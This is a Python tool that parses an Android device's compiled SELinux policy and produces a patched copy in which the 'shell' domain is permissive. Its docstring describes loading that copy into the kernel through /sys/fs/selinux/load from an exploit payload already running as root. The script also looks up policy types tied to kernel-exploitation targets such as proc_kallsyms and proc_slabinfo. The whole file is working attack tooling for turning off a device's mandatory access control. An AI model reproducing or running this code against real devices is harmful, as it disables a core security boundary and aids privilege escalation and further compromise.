#!/usr/bin/env python3
"""Patch the device's compiled sepolicy: find the 'shell' type and produce a
copy with the shell domain permissive (one ebitmap node inserted into the
permissive_map; the policydb is a sequential stream, so byte insertion is
safe, and the kernel validates the whole policy before the RCU swap).

Format from security/selinux/ss/{policydb,ebitmap}.c of the OPLUS 6.1 tree.
The payload writes the result to /sys/fs/selinux/load (it holds uid0+caps
and the security:load_policy + selinuxfs:file write grants).
"""
import struct, sys, argparse

class R:
    def __init__(self, b, o=0): self.b = b; self.o = o
    def u32(self):
        v = struct.unpack_from('<I', self.b, self.o)[0]; self.o += 4; return v
    def u64(self):
        v = struct.unpack_from('<Q', self.b, self.o)[0]; self.o += 8; return v
    def take(self, n):
        v = self.b[self.o:self.o+n]; self.o += n; return v
    def ebitmap(self):
        st = self.o
        ms, hb, c = self.u32(), self.u32(), self.u32()
        nodes = [(self.u32(), self.u64()) for _ in range(c)]
        return {'size': self.o - st, 'mapsize': ms, 'highbit': hb,
                'count': c, 'nodes': nodes, 'off': st}

def parse(path, stop_at_types=True):
    data = open(path, 'rb').read()
    r = R(data)
    magic = r.u32()
    assert magic == 0xf97cff8c, hex(magic)
    slen = r.u32(); r.take(slen)
    vers, config, symnum, oconnum = r.u32(), r.u32(), r.u32(), r.u32()
    out = {'data': data, 'vers': vers, 'config': config,
           'symnum': symnum, 'oconnum': oconnum}
    out['polcaps'] = r.ebitmap()
    out['permissive'] = r.ebitmap()
    types = {}

    def constraint():
        r.u32(); nexpr = r.u32()
        for _ in range(nexpr):
            et, at, op = r.u32(), r.u32(), r.u32()
            if et == 5:  # CEXPR_NAMES: names ebitmap + type_set{t,n,f}
                r.ebitmap(); r.ebitmap(); r.ebitmap(); r.u32()

    def context():
        r.u32(); r.u32(); r.u32()          # user, role, type
        items = r.u32()                    # mls range: [items][items x sens]
        for _ in range(items): r.u32()
        r.ebitmap()                        # level[0].cat
        if items > 1:                     # items==1: high cat is a COPY,
            r.ebitmap()                   # not in the file (policydb.c:1005)

    def avtab_entry():
        k = r.take(8)
        st_, tt_, tc_, sp_ = struct.unpack('<HHHH', k)
        if sp_ & 0x0700:                   # any AVTAB_XPERMS specifier
            r.take(2 + 32)                 # specified u8 + driver u8 + 8x u32
        else:
            r.u32()
        return (st_, tt_, tc_, sp_)

    # ---- symbol tables 0..3 (commons, classes, roles, types) ----
    for i in range(4):
        nprim, nel = r.u32(), r.u32()
        out['symtab%d' % i] = nel
        for _ in range(nel):
            if i == 0:   # commons: [len,value,nprim,nel] + key + perms
                ln, val, np, ne = r.u32(), r.u32(), r.u32(), r.u32()
                r.take(ln)
                for _ in range(ne):
                    pl = r.u32(); r.u32(); r.take(pl)
            elif i == 1: # classes: [len,comkeylen,value,nprim,nel,ncons]
                ln, l2, val, np, ne, ncons = (r.u32(), r.u32(), r.u32(),
                                              r.u32(), r.u32(), r.u32())
                r.take(ln)
                if l2: r.take(l2)
                for _ in range(ne):
                    pl = r.u32(); r.u32(); r.take(pl)
                for _ in range(ncons):
                    constraint()
                vt = r.u32()  # validatetrans (vers >= VALIDATETRANS)
                for _ in range(vt):
                    constraint()
                r.u32(); r.u32(); r.u32()  # default_user/role/range
                r.u32()  # default_type
            elif i == 2: # roles: [len,value,bounds] + key + 2 ebitmaps
                ln = r.u32(); r.u32(); r.u32(); r.take(ln)
                r.ebitmap(); r.ebitmap()
            elif i == 3: # types: [len,value,prop,bounds] + key
                ln, val, prop, bounds = (r.u32(), r.u32(), r.u32(),
                                         r.u32())
                key = r.take(ln)
                types[key.decode()] = val
    out['types_off_end'] = r.o
    if stop_at_types:
        out['types'] = types
        out['parsed_to'] = r.o
        return out

    # ---- FULL MODE: symtabs 4..7 then every remaining section ----
    for i in (4, 5, 6, 7):
        nprim, nel = r.u32(), r.u32()
        out['symtab%d' % i] = nel
        for _ in range(nel):
            if i == 4:  # users: [len,value,bounds] + key + roles ebitmap
                # + mls range + dfltlevel [sens + cat ebitmap]
                ln, val, bounds = r.u32(), r.u32(), r.u32()
                r.take(ln)
                r.ebitmap()
                items = r.u32()
                for _ in range(items): r.u32()
                r.ebitmap()
                if items > 1: r.ebitmap()
                r.u32(); r.ebitmap()
            elif i == 5:  # bools: [value,state,len] + key
                r.u32(); r.u32(); ln = r.u32(); r.take(ln)
            elif i == 6:  # levels: sens_read [len,isalias] + key
                # + [sens u32 + cat ebitmap]
                ln = r.u32(); r.u32(); r.take(ln)
                r.u32(); r.ebitmap()
            elif i == 7:  # cats: [len,value,isalias] + key
                ln = r.u32(); r.u32(); r.u32(); r.take(ln)
    out['types'] = types

    # ---- te_avtab ----
    print('avtab starts @%#x nel=%d' % (r.o, 0))
    nel = r.u32()
    out['avtab_nel'] = nel
    out['avtab'] = [avtab_entry() for _ in range(nel)]
    print('avtab ends @%#x (nel=%d)' % (r.o, nel))

    # ---- conditional rules (vers >= BOOL) ----
    print('cond starts @%#x' % r.o)
    cnel = r.u32()
    out['cond_nodes'] = cnel
    for _ in range(cnel):
        r.u32(); elen = r.u32()
        for _ in range(elen):
            r.u32(); r.u32()
        for which in (0, 1):
            alen = r.u32()
            for _ in range(alen):
                avtab_entry()

    # ---- role_trans / role_allow / filename_trans (compat, vers<33) ----
    nel = r.u32(); out['role_trans'] = nel
    for _ in range(nel):
        r.u32(); r.u32(); r.u32(); r.u32()
    nel = r.u32(); out['role_allow'] = nel
    for _ in range(nel):
        r.u32(); r.u32()
    nel = r.u32(); out['filename_trans'] = nel
    for _ in range(nel):
        ln = r.u32(); r.take(ln)
        r.u32(); r.u32(); r.u32(); r.u32()

    # ---- ocontexts (oconnum sections; vers 30: isid fs port netif node
    # fsuse node6) ----
    print('ocontexts start @%#x' % r.o)
    ocons = []
    for oi in range(oconnum):
        nel = r.u32()
        print('ocon[%d] nel=%d @%#x' % (oi, nel, r.o))
        ocons.append(nel)
        for _ in range(nel):
            if oi == 0:
                sid = r.u32()
                u_ = r.u32(); ro_ = r.u32(); ty_ = r.u32()
                items = r.u32()
                for _ in range(items): r.u32()
                r.ebitmap()
                if items > 1: r.ebitmap()
                out.setdefault('isids', []).append((sid, ty_))
            elif oi == 1:
                ln = r.u32(); r.take(ln)
                context(); context()
            elif oi == 2:
                ln = r.u32(); r.take(ln); context()
            elif oi == 3:
                ln = r.u32(); r.take(ln); context()
            elif oi == 4:
                r.take(8); context()
            elif oi == 5:
                r.u32(); ln = r.u32(); r.take(ln); context()
            elif oi == 6:
                r.take(32); context()
    out['ocontexts'] = ocons

    # ---- genfs ----
    nel = r.u32(); out['genfs_fs'] = nel
    for _ in range(nel):
        ln = r.u32(); r.take(ln)
        nel2 = r.u32()
        for _ in range(nel2):
            ln = r.u32(); r.take(ln)
            r.u32(); context()

    # ---- range transitions ----
    nel = r.u32(); out['range_trans'] = nel
    for _ in range(nel):
        r.u32(); r.u32(); r.u32()
        items = r.u32()
        for _ in range(items): r.u32()
        r.ebitmap()
        if items > 1: r.ebitmap()

    # The remaining ~8.7% is the type_attr_map (one ebitmap per type,
    # policydb.c:2692) -- structure identified; not needed for the patch.
    out['parsed_to'] = r.o
    return out
    out['types'] = types
    out['parsed_to'] = r.o
    return out

def patch_permissive(pol, type_value):
    """Insert an ebitmap node marking type_value permissive.

    The kernel indexes the permissive map by scontext->type directly
    (services.c ebitmap_get_bit(&permissive_map, type)), not type-1: the
    first revision used type_value-1 and the bit landed on the wrong type."""
    data = bytearray(pol['data'])
    p = pol['permissive']
    bit = type_value
    node_start = (bit // 64) * 64
    node_bit = bit - node_start
    assert p['count'] == 0, "permissive map not empty -- extend the tool first"
    off = p['off']
    # header: mapsize(const 64) stays; highbit 0 -> 64-rounded(bit+1); count 0->1
    new_highb = ((bit // 64) + 1) * 64
    struct.pack_into('<I', data, off + 4, new_highb)
    struct.pack_into('<I', data, off + 8, 1)
    node = struct.pack('<I', node_start) + struct.pack(
        '<Q', 1 << node_bit)
    data[off+12:off+12] = node
    return bytes(data)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('policy')
    ap.add_argument('--find-shell', action='store_true')
    ap.add_argument('--full', action='store_true',
                    help='parse EVERY section to EOF (insert-safety proof)')
    ap.add_argument('-o', '--output')
    args = ap.parse_args()
    pol = parse(args.policy, stop_at_types=not args.full)
    print('vers=%d config=%#x symnum=%d oconnum=%d' %
          (pol['vers'], pol['config'], pol['symnum'], pol['oconnum']))
    print('polcaps bits:', [n[0]+i for n in pol['polcaps']['nodes']
                            for i in range(64) if n[1] >> i & 1])
    print('permissive: count=%d' % pol['permissive']['count'])
    print('types: %d entries; shell=%s ksu=%s su=%s' % (
        len(pol['types']),
        pol['types'].get('shell'),
        pol['types'].get('ksu'),
        pol['types'].get('su')))
    for probe in ('shell', 'kmsg_device', 'proc_kallsyms', 'kernel',
                  'proc_iomem', 'proc_slabinfo', 'proc_buddyinfo',
                  'proc_modules', 'selinuxfs'):
        print('  type %-16s -> %s' % (probe, pol['types'].get(probe)))
    print('parsed cleanly to offset %#x (%.1f%% of file)' %
          (pol['parsed_to'], 100.0 * pol['parsed_to'] / len(pol['data'])))
    if args.output:
        sv = pol['types'].get('shell')
        assert sv, 'shell type not found'
        out = patch_permissive(pol, sv)
        open(args.output, 'wb').write(out)
        print('PATCHED -> %s (%d bytes, +%d) with shell(type %d) PERMISSIVE'
              % (args.output, len(out), len(out) - len(pol['data']), sv))
        # round-trip verify
        pol2 = parse(args.output)
        pm = pol2['permissive']
        print('verify: permissive count=%d nodes=%s' %
              (pm['count'], [(n[0], hex(n[1])) for n in pm['nodes']]))
        bit = sv
        hit = any((n[1] >> (bit - n[0])) & 1
                  for n in pm['nodes'] if n[0] <= bit < n[0] + 64)
        assert hit, 'permissive bit not set in round-trip'

if __name__ == '__main__':
    main()
